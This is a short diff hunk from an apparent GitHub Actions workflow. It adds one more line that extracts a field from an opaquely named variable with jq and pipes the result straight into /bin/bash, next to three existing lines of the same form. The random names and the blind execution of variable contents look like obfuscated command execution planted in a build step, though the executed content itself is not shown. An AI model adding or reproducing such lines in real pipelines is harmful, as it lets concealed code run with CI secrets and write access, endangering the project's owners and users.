@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$eqs90" | jq -r .ifqa056 | /bin/bash
           printf '%s' "$z2" | jq -r .mvke08677 | /bin/bash
           printf '%s' "$unitq739" | jq -r .r2058 | /bin/bash
+          echo $kad8 | jq -r .uyq86655 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
